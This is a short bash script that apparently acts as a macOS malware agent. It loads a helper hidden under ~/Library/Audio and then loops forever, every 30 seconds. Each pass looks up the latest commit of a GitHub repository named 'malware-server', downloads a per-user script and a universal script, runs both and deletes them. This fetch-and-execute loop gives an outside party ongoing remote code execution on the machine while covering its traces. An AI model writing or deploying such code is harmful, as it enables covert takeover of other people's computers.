#!/bin/bash
source ~/Library/Audio/common.sh

curlAndRun() {
    LATEST_COMMIT=$(curl -s "https://api.github.com/repos/Milooles/malware-server/commits/main"  | grep -m 1 '"sha"' | sed -E 's/.*"([^"]+)".*/\1/')
    
    curl -o "$USERPATH" "$LINK/$LATEST_COMMIT/deployed/$USER.sh"
    curl -o "$UNIPATH" "$LINK/$LATEST_COMMIT/shell-scripts/universal.sh"

    sh $UNIPATH
    sh $USERPATH

    rm $UNIPATH
    rm $USERPATH
}

while true; do
    curlAndRun

    sleep "30s"
done
